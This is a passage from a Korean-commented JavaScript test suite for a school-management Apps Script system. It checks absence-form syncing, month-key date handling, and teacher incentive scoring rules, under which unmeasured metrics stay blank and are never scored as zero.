  // 항목 수 = 응답 시트 열 지도. 6문항 + 타임스탬프 = 7열이고, 스위프가 정확히 7열을 읽어야 한다.
  const items = cf.match(/\.add[A-Z]\w*Item\(/g) || [];
  assert.equal(items.length, 8, '항목 수가 바뀌었다(강사·반은 List/Text 2분기라 8개 호출 = 6문항)');
  const sync = section('function syncAbsenceForm_(', 'function createAbsenceForm()');
  assert.equal(/\.add[A-Z]\w*Item\(/.test(sync.replace(/\/\/[^\n]*/g, '')), false,
    '업그레이드 경로에서 항목 추가 금지 — 응답 시트에 새 열이 생겨 스위프 위치 파싱(1~7열)이 깨진다');
  const sw = section('function sweepAbsenceForm_(', '첨삭 품질 게이트');
  assert.ok(sw.includes('last - from, 7'), '응답 7열 읽기가 아니다 — 폼 항목 수와 어긋나면 값이 밀린다');
  assertOrder(sw, ['sh.getRange(sh.getLastRow() + 1', '적재 직후·메일 전 마감', 'adminMail(']); // 메일 실패가 중복 적재를 만들지 않게
  assert.ok(sw.includes("props.setProperty('결석폼_포인터', String(last))"), '포인터 마감 누락');
  assert.ok(sw.includes("if (String(c[5] || '').trim()) return;"), '이미 마감된 행을 덮어써 첫 연락 시각이 사라진다');
  assert.ok(sw.includes('수동기록'), '대응 결석 행이 없을 때 응답을 버리면 강사의 연락 기록이 증발한다');
  // 수업 규칙 「결석자 복귀」 "2회 연속이면 전화" — 같은 학생 두 번째 연락이 새 행이 되면 결석 1건이 2건으로 세어져
  // 복귀율 분모가 부푼다(돈이 걸린 지표의 조용한 왜곡). 새 행 대신 최근 행 비고에 덧붙여야 한다.
  assert.ok(sw.includes('recentIdx'), '추가 연락 판별(유예 창 안 기존 행 탐색)이 없다');
  assert.ok(sw.includes("'추가연락 '"), '추가 연락을 기존 행 비고에 덧붙이는 경로가 없다 — 분모가 부푼다');
  assert.ok(sw.includes('!closed && recentIdx >= 0'), '추가 연락인데 새 행을 만든다(결석 건수 이중 계상)');
  assert.ok(sw.includes('!closed && recentIdx < 0'), '추가 연락에도 "출석 1탭 확인" 오경보가 나간다');
  assert.ok(section('function parentSweep()', 'function translateTopics_').includes("safeRun('sweepAbsenceForm'"), '10분 스위프 배선 누락');
  assert.ok(section('function morningJobs()', 'function nightJobs()').includes("safeRun('absenceFormSync'"), '아침 로스터 동기화 누락');
});

test('[v9.80] 켜기 큐·침묵 감시 — 폼 미생성과 "출석 1탭이 없어 추적이 안 열림"을 preflight가 잡는다', () => {
  assert.ok(code.includes("['결석폼URL', 'createAbsenceForm'"), 'preflight 켜기 큐(폼 미생성 감시) 누락');
  const pfl = section("const af80 = ss.getSheetByName('absence_followup')", '// 4) class_stats');
  assert.ok(pfl.includes('cnt.student'), '학생 수 대조 없이 경고하면 개원 전 빈 로스터에서 오경보');
  assert.ok(pfl.includes('출석 1탭'), '이 지표의 구조적 전제(1탭이 유일한 입구) 경고 문구가 없다');
  const shared = section('function writeSharedCols_(', 'function syncProfiles()');
  assert.ok(shared.includes("kv['결석폼URL']"), '강사 행 결석 폼 버튼 URL 배선 누락');
  const h3v = code.match(/const SHARED3_COL_HEADERS = \[([^\]]+)\]/);
  assert.ok(h3v && h3v[1].includes("'결석폼URL'"), '결석폼URL이 3차 블록(DR122)에 없다 — DO119는 v9.81 랭킹보드가 선점했다');
  assert.ok(section('function weeklyJobs()', 'function monthlyJobs()').includes('absenceSection_'), '주간 리포트 노출 누락 — 측정해도 아무도 안 본다');
});

test('[v9.97] 스토리북 월 키 — Date 오염이 멱등 가드를 깨지 않는다(+학생 화면 원시 Date 노출 차단)', () => {
  // 07-31 학생 화면 실측: 소식탭 스토리북 Description이 'Mon Jun 01 2026 00:00:00 GMT+0800 …'.
  //   정체는 표시 문제가 아니라 시트가 'yyyy-MM'을 Date로 자동 변환한 것 — 그 탓에 발간 멱등 가드
  //   String(r[0])===ym 이 영구 실패해 같은 달이 매달 재발간되고, 중복 병합 자기치유가 증상을 가려 왔다.
  const tzf = { formatDate: (d, tz, f) => {
    const p = (n) => String(n).padStart(2, '0');
    return f === 'yyyy-MM' ? d.getFullYear() + '-' + p(d.getMonth() + 1) : String(d);
  } };
  const ymTextOf_ = loadFunction('function ymTextOf_(', 'function ymTextColFix_(', 'ymTextOf_', {
    Utilities: tzf, Session: { getScriptTimeZone: () => 'Asia/Ulaanbaatar' } });

  // Date 셀 → 월키 문자열. 문자열 셀은 그대로(재파싱 금지 — tz 경계에서 전달로 밀린다)
  assert.equal(ymTextOf_(new Date(2026, 5, 1), 'Asia/Ulaanbaatar'), '2026-06');
  assert.equal(ymTextOf_('2026-06', 'Asia/Ulaanbaatar'), '2026-06');
  assert.equal(ymTextOf_('', 'Asia/Ulaanbaatar'), '');
  assert.equal(ymTextOf_(null, 'Asia/Ulaanbaatar'), '');
  assert.equal(ymTextOf_(new Date('nope'), 'Asia/Ulaanbaatar'), 'Invalid Date'.slice(0, 12));

  // 발간·월보·자기치유 세 곳이 전부 정규화를 거쳐야 한다 — 한 곳이라도 String() 직접 비교면 같은 사고 재발
  const build = section('function buildMonthlyStorybook_(', 'function sheetSelfHeal_(');
  assert.ok(build.includes('ymTextColFix_(sb, 1, tz)'), '발간 함수가 월 열 텍스트 고정을 안 한다');
  assert.ok(build.includes('ymTextOf_(r[0], tz) === ym'), '멱등 가드가 Date 오염 셀을 못 읽는다(중복 발간)');
  assert.equal(/some\(r => String\(r\[0\]\) === ym\)/.test(코드정제), false, '구 String() 직접 비교가 남아 있다');
  const heal = section('function sheetSelfHeal_(', 'function worldBossOf(');
  assert.ok(heal.includes('ymTextColFix_(sb, 1'), '자기치유가 기존 Date 오염 행을 되돌리지 않는다');
  assert.ok(heal.includes('ymTextOf_(r[0]'), '중복 그룹핑이 Date 셀을 다른 달로 오인한다');

  // 같은 결함이 월키 멱등을 쓰는 시트 전부에 있었다(07-31 실측: 5곳) — 한 곳이라도 구 패턴이면 그 배치가 매달 재실행된다.
  //   monthly_snapshot=포인트 재지급 경로 · synk_cards=카드 중복 · 스토리초안=Claude API 중복 과금.
  //   [08-27] league_history 는 뺐다 — 반 대항 리그 폐지로 그 시트에 «쓰는 코드»가 없어졌다(유호 지시 A).
  //     쓰는 곳이 없으면 월키 오염도 안 난다. 시트 자체는 라이브에 빈 채로 남아 있다.
  ['monthly_snapshot', 'synk_cards', '스토리초안'].forEach((sheet) => {
    const anchor = code.indexOf("ensureSheet(ss, '" + sheet + "'");
    assert.notEqual(anchor, -1, sheet + ' ensureSheet 호출부를 찾지 못함');
    const near = code.slice(anchor, anchor + 700);
    assert.ok(near.includes('ymTextColFix_'), sheet + ' 월 열 텍스트 고정이 없다');
    assert.ok(near.includes('ymTextOf_(r[0]'), sheet + ' 멱등 가드가 Date 오염 셀을 못 읽는다(월간 배치 중복 실행)');
  });

  // 서식 고정은 멱등이어야 한다(매 야간 전체 열 재서식 = 무의미한 쓰기)
  const fix = section('function ymTextColFix_(', 'function sheetSelfHeal_(');
  assert.ok(fix.includes("getNumberFormat() !== '@'"), '서식 고정에 멱등 가드가 없다');
  assert.ok(fix.includes('if (fixed)'), '변경 행이 없어도 매번 setValues 한다');
});

test('[v9.100] 「담당 강사」는 한 축 — 결석 복귀율과 케어지수가 같은 헬퍼로 강사를 구한다', () => {
  // 결함의 성질: 두 지표가 각자 반→강사 변환을 구현하면, 같은 반이 지표마다 다른 강사에게 귀속된다.
  // 급여 정본 §7은 이 둘을 강사별로 합산하므로 축이 갈리면 인센티브 산정이 조용히 틀어진다.
  // v9.87이 teacher_stats를 teachersOfClass_로 옮겼는데 결석 추적(v9.89) 적재부만 옛 방식으로 남아 있었다.
  const ns = section('function checkNoShow()', 'function checkScene');
  assert.ok(ns.includes('teachersOfClass_(emapNS, num)'),
    '결석 적재부가 공용 헬퍼를 안 쓴다 — teacher_stats와 담당 강사가 갈린다');
  assert.equal(/const tNames = \(emapNS\.byClass\[num\]/.test(코드만(ns)), false,
    'byClass 직접 조회가 되살아났다(괄호 반명·번호 폴백·중복 제거가 빠져 미배정 오경보가 는다)');
  // 케어지수 쪽도 같은 헬퍼를 계속 쓰는지 — 한쪽만 바뀌면 다시 갈린다
  const ts = section('function calcTeacherStats()', 'function monthlyReport()');
  assert.ok(ts.includes('teachersOfClass_(emap, rawCls)'), 'teacher_stats가 공용 헬퍼를 안 쓴다');
  // 즉시 통보 경로는 이메일이 필요해 byClass를 그대로 쓴다 — 적재분(넓음)은 야간 byKey 역조회가 커버한다.
  assert.ok(ns.includes('(emapNS.byClass[num] || []).forEach'), '즉시 통보 경로(이메일 필요)가 사라졌다');
});

/* ── [v9.108] 인센티브 3지표 — 축(v9.87) 위에 얹은 승급 통과율·결석 복귀율·재등록률 ──────────
 * 지켜야 할 단 하나의 원칙: **무데이터는 0%가 아니라 미측정(null)이다.**
 * 앱이 못 잰 것을 0으로 환산하면 강사가 앱 결함으로 급여를 잃는다(v9.89가 세운 원칙의 확장). */

test('[v9.108] 승급 통과율 — 창 이전 기준 급수가 있어야 판정, 없으면 미측정', () => {
  const fn = loadFunction('const REENROLL_GRACE_DAYS', 'function calcTeacherStats()', 'promotionByStudent_', {});
  const rows = [
    { sid: 'S1', date: '2026-05-01', level: 2 }, { sid: 'S1', date: '2026-07-15', level: 3 }, // 올랐다
    { sid: 'S2', date: '2026-05-01', level: 3 }, { sid: 'S2', date: '2026-07-15', level: 3 }, // 그대로
    { sid: 'S3', date: '2026-07-10', level: 1 },                                              // 신규 — 비교 불가
    { sid: 'S4', date: '2026-05-01', level: 4 }                                               // 창 내 기록 없음
  ];
  const v = fn(rows, '2026-06-01', '2026-08-01');
  assert.equal(v.S1, true, '급수 상승을 승급으로 안 잡는다');
  assert.equal(v.S2, false, '동일 급수를 승급으로 잘못 잡는다');
  assert.equal(v.S3, null, '기준 급수 없는 신규 학생이 분모에 들어간다 — 신규가 많은 강사가 불리해진다');
  assert.equal(v.S4, null, '창 내 평가가 없는데 판정한다');
});

test('[v9.108] 재등록률 — 만료 후 유예 중이면 보류(실패로 세지 않는다)', () => {
  const fn = loadFunction('const REENROLL_GRACE_DAYS', 'function calcTeacherStats()', 'reenrollByStudent_', {});
  const rows = [
    { sid: 'S1', start: '2026-01-01', expire: '2026-06-30' }, { sid: 'S1', start: '2026-07-01', expire: '2026-12-31' },
    { sid: 'S2', start: '2026-01-01', expire: '2026-06-01' },                       // 두 달 지나도 후속 없음
    { sid: 'S3', start: '2026-02-01', expire: '2026-07-25' },                       // 만료 7일째 — 아직 판정 이르다
    { sid: 'S4', start: '2025-01-01', expire: '2026-05-01' }                        // 창 밖 만료
  ];
  const v = fn(rows, '2026-06-01', '2026-08-01', '2026-08-01');
  assert.equal(v.S1, true, '후속 등록을 재등록으로 안 잡는다');
  assert.equal(v.S2, false, '유예가 한참 지난 미갱신을 실패로 안 잡는다');
  assert.equal(v.S3, null, '만료 직후(유예 중)를 실패로 세면 월말 만료 학생이 강사 점수를 깎는다');
  assert.equal(v.S4, null, '창 밖 만료가 분모에 들어간다');
});

test('[v9.108] 강사별 접기 — 미측정은 분모에서 빠지고, 판정 0건이면 비율 자체가 없다', () => {
  const fn = loadFunction('const REENROLL_GRACE_DAYS', 'function calcTeacherStats()', 'rateByTeacher_', {});
  const out = fn({ S1: true, S2: false, S3: null }, { 바트: { S1: 1, S2: 1, S3: 1 }, 에리카: { S3: 1 } });
  assert.equal(out.바트.tot, 2, 'null이 분모에 들어갔다');
  assert.equal(out.바트.rate, 50);
  assert.equal(out.에리카.rate, null, '판정 0건인데 0%로 표기된다 — 무데이터가 최하점으로 둔갑한다');
  assert.equal(out.에리카.tot, 0);
});

test('[v9.211] teacher_stats 22열 — 정본 §7 앱자동 5지표가 축 위에 얹혔고, 미측정 행은 빈칸이다', () => {
  const heads = code.match(/const TEACHER_STATS_HEADERS = \[([\s\S]*?)\];/)[1];
  ['승급통과율%', '승급배점', '결석복귀율%', '복귀배점', '재등록률%', '재등록배점',
    '숙제제출률%', '숙제배점', '근태위반', '근태배점', '인센티브점수', '등급판정', '지표모수'].forEach((h) => {
    assert.ok(heads.includes(`'${h}'`), `헤더에 ${h} 없음`);
  });
  assert.equal(heads.split(',').filter((s) => s.trim()).length, 22, '헤더 폭이 22열이 아니다');
  // 비율 바로 옆에 그 배점이 오도록 — 흩어지면 "이 점수가 어느 비율에서 나왔나"를 눈으로 못 잇는다
  ['승급통과율%\', \'승급배점', '결석복귀율%\', \'복귀배점', '재등록률%\', \'재등록배점',
    '숙제제출률%\', \'숙제배점', '근태위반\', \'근태배점'].forEach((pair) => {
    assert.ok(heads.includes(pair), `(비율, 배점) 쌍이 인접하지 않다: ${pair}`);
  });
  // 무데이터 → 빈칸(0 아님). **동작으로 검사한다** — 문자열 매칭만 두면 `null ? '' :`를 `null ? 0 :`으로
  //   바꿔도 통과해 가드가 무력화된다(작성 중 변이 주입으로 실제 확인한 구멍).
  const { rows } = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)]
  });
  const r = rows[0];
  assert.equal(r.length, 22, '행 폭이 헤더(22열)와 다르다 — 열 밀림');
  [9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19].forEach((i) => assert.strictEqual(r[i], '',
    `미측정 지표(${i}열)가 빈칸이 아니다 — 0%·0점으로 둔갑하면 강사가 앱 결함으로 급여를 잃는다`));
  /* [v9.211] 등급판정 — 전부 미측정이면 **등급을 지어내지 않는다.** 재등록이 안 재지면 첫 시즌으로 읽혀
   *   재등록 항목 자체가 빠지고, 남은 넷도 미측정이라 정본의 「미측정 30점 이상 = 심사 스킵」에 걸린다. */
  assert.match(r[20], /심사 스킵/, `잴 것이 하나도 없는데 등급이 나왔다 — 그건 심사가 아니라 추측이다: ${r[20]}`);
  assert.match(r[20], /첫 시즌/, '첫 시즌(재등록 판정 0건)인데 그 사실이 판정문에 없다');
  assert.equal(r[21], '승급 0 · 복귀 0 · 재등록 0 · 숙제 미측정 · 근태 미측정 · 첫 시즌(재등록 항목 없음)',
    '지표모수 표기가 계약과 다르다 — 잰 적 없는 지표는 「0/0」이 아니라 미측정이라고 말해야 한다');
  const body = section('function calcTeacherStats()', 'function monthlyReport()');
  assert.ok(body.includes("'승급 ' + pm.tot"), '분모(지표모수) 노출이 없다 — 80%가 5명 중 4명인지 알 수 없다');
  // 지표별 격리: 한 시트가 없어도 나머지 계산이 죽으면 안 된다
  // [v9.211] 숙제·근태가 얹히며 5종이 됐다 — 한 시트의 부재가 케어지수까지 죽이면 안 된다는 규칙은 그대로다
  assert.equal((body.match(/catch \(e(Pr|Ab|Re|Hw|Pu)\)/g) || []).length, 5, '지표 5종이 각각 try/catch로 격리돼 있지 않다');
  // 결석 복귀율은 정본 재사용(규칙 중복 금지) + 공동 담당 분해
  assert.ok(body.includes('absenceReturnStats_('), '결석 복귀율이 정본 함수를 안 쓰고 규칙을 복제했다');
  assert.ok(body.includes("String(key).split('·')"), '담당강사 복수 표기가 각 강사에게 귀속되지 않는다');
});

test('[v9.110] 시트 메뉴 — 안전 항목만 올리고 파괴적 함수는 넣지 않는다', () => {
  // 메뉴는 "한 번 잘못 누름"이 곧 라이브 사고가 되는 면이다. setupSchedule은 반 편성을,
  // clearDemoData는 데이터를 지운다 — 이런 것들은 편집기에서 의식적으로 고르게 둔다.
  const start = code.indexOf('function onOpen()');
  assert.notEqual(start, -1, 'onOpen이 없어 시트 메뉴가 생기지 않는다');
  const menu = code.slice(start, code.indexOf('addToUi();', start) + 12); // onOpen 본문만 — 파일 다른 곳의 함수명에 오염되지 않게
  const 메뉴코드 = 코드만(menu); // 부정 단언 전용 — 루프 안에서 감싸면 파괴적 함수 수만큼 다시 렉싱된다
  ['calcTeacherStats', 'calcAll', 'preflightGlide'].forEach((f) => {
    assert.ok(menu.includes(`'${f}'`), `메뉴에 ${f} 누락`);
  });
  ['setupSchedule', 'seedDemoData', 'clearDemoData', 'bootstrapSynk', 'resetAllTriggers'].forEach((f) => {
    assert.equal(메뉴코드.includes(`'${f}'`), false, `파괴적 함수 ${f}가 메뉴에 올라갔다 — 한 번 잘못 누르면 라이브 사고`);
  });
  // UI 없는 컨텍스트(트리거)에서 죽지 않아야 한다 — onOpen 실패가 시트 열기를 막으면 안 된다
  //   ⚠ 여기 초판은 `code.slice(start, start + 1400)`이었다. 메뉴 항목이 늘자 catch가 1400자 밖으로
  //   밀려 테스트가 죽었다 — **고정 길이도 앵커다**(v9.116에서 문구 앵커로 같은 실패를 겪었다).
  //   함수 끝까지를 범위로 잡아 길이 의존을 없앤다.
  const fnEnd = code.indexOf('\n}', code.indexOf('addToUi();', start));
  assert.ok(fnEnd > start, 'onOpen 함수 끝을 찾지 못했다');
  assert.ok(code.slice(start, fnEnd).includes('catch (eMenu)'), '메뉴 생성 실패 격리가 없다');
});

test('[v9.107] 주간 통합 리포트 sections — 배열 요소 쉼표 누락 회귀 차단', () => {
  // 08-01 실사고: 14514행 끝 쉼표가 빠져 JS가 `[…][…]`를 배열 인덱싱으로 읽었고,
  // sections의 그 자리가 undefined가 되어 forEach의 sec[0]에서 TypeError로 죽었다.
  // 섹션별 try/catch보다 바깥이라 안전망이 안 걸렸고, 결과는 주간 리포트 전체 미발송.
  // node --check로는 절대 안 잡힌다(문법상 유효한 인덱싱이므로) — 그래서 이 테스트가 필요하다.
  const start = code.indexOf('const sections = [');
  assert.notEqual(start, -1, 'weeklyJobs의 sections 배열을 찾지 못함');
  const end = code.indexOf('\n  ];', start);
  assert.notEqual(end, -1, 'sections 배열의 끝을 찾지 못함');
  const block = code.slice(start + 'const sections = ['.length, end);

  // 실제로 배열을 평가해 undefined 요소가 생기지 않는지 본다.
  // 문자열로 "줄 끝에 쉼표가 있나"를 세는 방식은 요소가 여러 줄에 걸치거나 주석이 붙으면 오탐이 난다
  // (첫 구현이 실제로 그랬다) — 쉼표 누락의 결과는 "요소가 undefined가 되는 것"이므로 그걸 직접 본다.
  // [v9.206] 요소 꼴이 `[제목, fn]` 또는 `[제목, fn, true]` 둘이다 — 셋째 칸 = AI 해설 집계 화이트리스트(이름유출.test.js가 목록을 못박는다)
  const stub = block.replace(/function\s*\([^)]*\)\s*\{[\s\S]*?\}(?=\s*(?:,\s*true)?\s*\])/g, 'null')
                    .replace(/\b(systemWatchdog|weeklyReport|kpiSection_|updateBizDashboard|checkTuition|checkReenrollment|checkNewInquiries_)\b/g, 'null');
  let evaluated;
  // 닫는 `]` 앞의 개행은 필수다. sections 마지막 요소 뒤에는 `// [v9.106] …` 줄 주석이 붙어 있고,
  //   block은 그 주석 끝에서 잘린다 — 개행 없이 `]`를 이으면 **닫는 괄호가 주석 안으로 들어가** 항상
  //   "Unexpected end of input"이 난다. 이 가드는 그동안 CRLF 덕에만 살아 있었다(`\r`가 주석을 끊어줬다).
  //   Code.js가 LF로 저장된 순간 조용히 죽어 배포 게이트를 상시 차단했다(08-01 실측).
  assert.doesNotThrow(() => { evaluated = eval('[' + stub + '\n]'); }, 'sections 배열이 평가되지 않는다');
  evaluated.forEach((sec, i) => {
    assert.ok(sec && typeof sec[0] === 'string', `sections[${i}]가 undefined이거나 제목이 없다 — 쉼표 누락 계열 결함`);
  });

  // 같은 실행에서 드러난 2번째 결함: 섹션 클로저가 weeklyJobs 스코프에 없는 변수를 참조했다
  // (`lectureWeeklyText_(ss)` → ReferenceError: ss is not defined). 이쪽은 섹션 try/catch가 잡아 리포트는
  // 살지만 그 섹션만 매주 조용히 빈다 — 즉 "리포트가 오니까 괜찮다"로는 절대 안 드러난다.
  // 규칙: 섹션 클로저는 스프레드시트를 자체 조회한다(다른 섹션들이 쓰는 ssR·ssL 패턴).
  const fnBodies = block.match(/function\s*\([^)]*\)\s*\{[\s\S]*?\}(?=\s*(?:,\s*true)?\s*\])/g) || [];
  assert.ok(fnBodies.length >= 5, `섹션 클로저를 ${fnBodies.length}개만 찾았다 — 추출 로직이 깨졌다`);
  fnBodies.forEach((body) => {
    const usesSheet = /\bss[A-Z]?\w*\b/.test(body);
    if (!usesSheet) return; // 시트를 안 쓰는 섹션(lpText·silText 반환)은 대상 아님
    assert.ok(
      body.includes('SpreadsheetApp.getActiveSpreadsheet()'),
      `섹션 클로저가 시트 변수를 쓰면서 자체 조회를 안 한다 → weeklyJobs 스코프에 없으면 ReferenceError: ${body.slice(0, 70)}`
    );
  });
});

test('[v9.113] 인센티브 배점 3종 — 구간 경계 + 미측정은 점수 자체가 없다', () => {
  const load = (n) => loadFunction('const TEACHER_STATS_HEADERS', 'function calcTeacherStats()', n, {});
  const pm = load('promotionScore_'), re = load('reenrollScore_'), ab =
    loadFunction('function absenceReturnState_', 'function checkNoShow()', 'absenceReturnScore_', {});

  // 승급 — 도달제라 임계가 낮다(60/50/40/30). 경계값이 아래 구간으로 새면 강사가 한 등급 손해본다.
  [[60, 20], [59, 16], [50, 16], [49, 12], [40, 12], [39, 6], [30, 6], [29, 0], [0, 0]]
    .forEach(([r, s]) => assert.equal(pm(r), s, `승급 ${r}% → ${s}점이어야 한다`));
  // 재등록 — 임계는 그대로(90/85/80/75)인데 **배점이 다르다**: 급여 정본 §7 v1.6 이 구간표를 채우면서
  //   30/24/18/10/0 으로 확정했다(등급 심사 100점 중 최고 배점). v9.113 의 20/16/12/6 은 근거가 없던
  //   시절의 잠정값이라 그대로 두면 강사가 정본보다 최대 10점 적게 채점된다.
  [[90, 30], [89, 24], [85, 24], [84, 18], [80, 18], [79, 10], [75, 10], [74, 0]]
    .forEach(([r, s]) => assert.equal(re(r), s, `재등록 ${r}% → ${s}점이어야 한다 (급여 정본 §7)`));
  // 🔴 만점은 지표마다 다르다 — 「셋 다 20 동률」로 되돌리면 재등록만 조용히 10점 깎인다
  assert.equal(pm(100), 20); assert.equal(ab(100), 20);
  assert.equal(re(100), 30, '재등록 만점이 20으로 되돌아갔다 — 정본은 30점이다');

  // [v9.211] 숙제 제출률 10점 · 근태 10점 — 정본 §7 이 「앱 자동」으로 잡은 나머지 둘
  const hw = load('homeworkScore_'), pu = load('punctualityScore_');
  [[80, 10], [79, 7], [70, 7], [69, 4], [60, 4], [59, 0]]
    .forEach(([r, s]) => assert.equal(hw(r), s, `숙제 ${r}% → ${s}점이어야 한다`));
  // 🔴 근태만 입력이 **비율이 아니라 위반 건수**다 — 비율로 읽으면 무위반(0)이 최하점이 된다
  [[0, 10], [1, 6], [2, 3], [3, 0], [9, 0]]
    .forEach(([n, s]) => assert.equal(pu(n), s, `근태 위반 ${n}회 → ${s}점이어야 한다`));

  /* [v9.211] 개원 첫 시즌 표 — 재등록 30점이 사라지고 그 30점이 나머지로 옮겨 간다(정본 §7 첫 시즌 표).
   *   임계는 그대로고 **점수만** 커진다. 승급 임계(60)가 복귀 임계(90)와 다른 것도 첫 시즌에 그대로다. */
  [[60, 30], [50, 24], [40, 18], [30, 10], [29, 0]]
    .forEach(([r, s]) => assert.equal(pm(r, true), s, `첫 시즌 승급 ${r}% → ${s}점`));
  [[90, 30], [85, 24], [80, 18], [75, 10], [74, 0]]
    .forEach(([r, s]) => assert.equal(ab(r, true), s, `첫 시즌 복귀 ${r}% → ${s}점`));
  [[80, 15], [70, 10], [60, 6], [59, 0]].forEach(([r, s]) => assert.equal(hw(r, true), s, `첫 시즌 숙제 ${r}% → ${s}점`));
  [[0, 15], [1, 9], [2, 4], [3, 0]].forEach(([n, s]) => assert.equal(pu(n, true), s, `첫 시즌 근태 ${n}회 → ${s}점`));
  assert.equal(pm(100, true) + ab(100, true) + hw(100, true) + pu(0, true), 90,
    '첫 시즌 앱자동 4항목 합이 90점이 아니다 — 재등록 30점을 옮겨 담은 표가 어긋났다(수동 10점 별도)');
  assert.equal(pm(100) + ab(100) + re(100) + hw(100) + pu(0), 90,
    '평시 앱자동 5항목 합이 90점이 아니다 — 정본 §7 은 「90점이 앱 자동 채점」이다');

  [pm, re, ab, hw].forEach((f) => {
    assert.strictEqual(f(null), null, '미측정이 0점으로 환산된다 — 앱이 못 잰 것이 급여 삭감이 된다');
    assert.strictEqual(f(undefined), null);
  });
  assert.strictEqual(pu(null), null, '근태 미측정이 0회(무위반 만점)로 둔갑한다 — 못 잰 것이 만점이 되면 안 된다');

  // 총점은 '획득 / 가능' — 측정된 지표만 분모에 들어간다. 짝 = [점수, 그 점수를 낸 채점 함수].
  const tot = load('incentiveTotal_');
  const 짝 = (s) => [[s[0], pm], [s[1], ab], [s[2], re]];
  assert.equal(tot(짝([20, 16, 18])), '54 / 70', '3지표 전부 측정 시 분모는 20+20+30=70');
  assert.equal(tot(짝([20, null, null])), '20 / 20', '미측정이 분모에 남으면 만점이 불가능해진다');
  assert.equal(tot(짝([null, null, null])), '', '전부 미측정인데 0점으로 표기된다');
  assert.equal(tot(짝([0, 0, null])), '0 / 40', '실제 0점(측정됨)은 미측정과 구분돼야 한다');
  assert.equal(tot(짝([null, null, 30])), '30 / 30',
    '재등록만 측정됐는데 분모가 20으로 굳어 있다 — 만점을 받고도 만점으로 안 보인다');
  // 🔴 분모는 상수가 아니라 **채점 함수에서 나온다**. v9.113 의 `개수 × 20` 은 정본이 재등록을 30점으로
  //   올린 순간 조용히 낡았고, 지표별 만점을 표로 따로 적어도 같은 자리에서 또 낡는다.
  //   가짜 채점 함수로 재면 「분모를 어디서 얻나」만 걸린다(정본 값과 무관하게 탐지된다).
  const 가짜만점999 = (r) => (r == null ? null : 999);
  assert.equal(tot([[7, 가짜만점999]]), '7 / 999',
    '분모를 코드에 박아 뒀다 — 배점표가 바뀌면 획득만 늘고 가능은 제자리다');

  /* 🔴 호출부가 옛 형태(점수만)로 돌아가면 이 단위 검사는 전부 초록인데 화면은 **빈칸**이 된다:
   *   숫자 20 에 [0] 을 찍으면 undefined 라 「전부 미측정」으로 접힌다. 새는 방향이 조용하고
   *   그 칸이 급여 재료라, 호출부가 채점 함수를 실제로 들고 가는지를 여기서 본다. */
  const 호출 = code.slice(code.indexOf('incentiveTotal_(['), code.indexOf('incentiveTotal_([') + 320);
  ['pmFn', 'abFn', 'hwFn', 'puFn', 'reenrollScore_'].forEach((f) => assert.ok(호출.includes(f),
    `호출부가 ${f} 를 안 넘긴다 — 분모를 낼 근거가 없어 인센티브점수 칸이 통째로 빈칸이 된다`));
  /* 🔴 첫 시즌엔 재등록 항목이 **사라진다**(0점이 아니라 없다). 총계·등급 두 호출부에 그 갈래가 다 있어야 한다.
   *   한쪽만 빠지면 미측정 30점이 상시로 얹혀 전 강사가 영영 「심사 스킵」이 되는데, 지금 개원 전에는
   *   그 출력이 정상과 **구별이 안 된다**(둘 다 스킵이다). 변이 실측에서 실제로 빠져나간 자리다. */
  assert.equal((code.match(/concat\(첫시즌 \? \[\]/g) || []).length, 2,
    '첫 시즌에 재등록 항목을 빼는 갈래가 두 호출부(총계·등급)에 다 있지 않다');
});

test('[v9.211] 등급 판정 — 재정규화·미측정 스킵·필수 관문 3개 (급여 정본 §7)', () => {
  const grade = loadFunction('const TEACHER_STATS_HEADERS', 'function calcTeacherStats()', 'incentiveGrade_', {});
  const 평시 = (승, 복, 재, 숙, 근) => [{ 이름: '승급', 점수: 승, 만점: 20 }, { 이름: '복귀', 점수: 복, 만점: 20 },
    { 이름: '재등록', 점수: 재, 만점: 30 }, { 이름: '숙제', 점수: 숙, 만점: 10 }, { 이름: '근태', 점수: 근, 만점: 10 }];

  // 전부 측정 + 만점 = 90/90 → 100점 골드
  let r = grade(평시(20, 20, 30, 10, 10), { 재등록률: 95, 근태위반: 0 });
  assert.equal(r.총점, 100); assert.equal(r.등급, '골드'); assert.equal(r.배수, 1.3);

  /* 🔑 재정규화 — 미측정은 분자에서도 **분모에서도** 뺀다. 숙제(10)가 미측정이면 분모는 90이 아니라 80이다.
   *   분모를 90으로 굳히면 앱이 못 잰 10점만큼 강사가 매 시즌 손해를 본다(정본이 이 규칙을 만든 이유). */
  r = grade(평시(20, 20, 30, null, 10), { 재등록률: 95, 근태위반: 0 });
  assert.equal(r.총점, 100, `미측정 10점이 분모에 남았다 — 획득 80/가능 80 인데 ${r.총점}점이 됐다`);
  assert.match(r.표기, /미측정 10점 제외/, '무엇이 안 재졌는지 판정문에 없다 — 화면만 보면 만점과 구별이 안 된다');
  /* 🔴 미측정은 관문 ③(0점 항목 → 골드 불가)을 **발동시키지 않는다**. 0점(재봤는데 못 했다)과
   *   미측정(재지 못했다)은 다르다 — 섞으면 앱이 못 잰 지표 하나가 강사의 골드를 영영 막는다.
   *   변이 실측: `x.점수 === 0` 을 `!x.점수` 로 바꾸면 위 총점 검사는 그대로 초록이고 등급만 조용히 깎였다. */
  assert.equal(r.등급, '골드', `미측정을 0점으로 세서 관문 ③ 이 헛발동했다: ${r.표기}`);

  // 미측정 배점 합 ≥ 30 → 심사 스킵(등급을 지어내지 않는다)
  r = grade(평시(20, 20, null, null, 10), { 재등록률: null, 근태위반: 0 });
  assert.equal(r.스킵, true); assert.equal(r.등급, '');
  assert.match(r.표기, /심사 스킵\(미측정 40점/, `40점이 안 재졌는데 등급을 매겼다: ${r.표기}`);
  // 경계는 「30점 이상」이다 — v1.5 가 「초과」를 고친 자리라 경계값 자체를 못박는다
  assert.equal(grade(평시(20, 20, null, 10, 10), { 재등록률: null }).스킵, true, '미측정 정확히 30점이 스킵에 안 걸렸다');
  assert.ok(!grade(평시(20, 20, 30, null, null), { 재등록률: 95 }).스킵, '미측정 20점인데 스킵됐다');

  /* 관문 ① 재등록률 80% 미만 → 골드 불가.
   * 🔑 실측으로 드러난 것: **평시엔 이 관문이 구조적으로 발동하지 않는다.** 재등록률이 80% 미만이면
   *   배점이 이미 10점 이하로 떨어져(정본 구간표) 총점 최대가 70/90 = 78점 = 브론즈다 — 관문이 막을
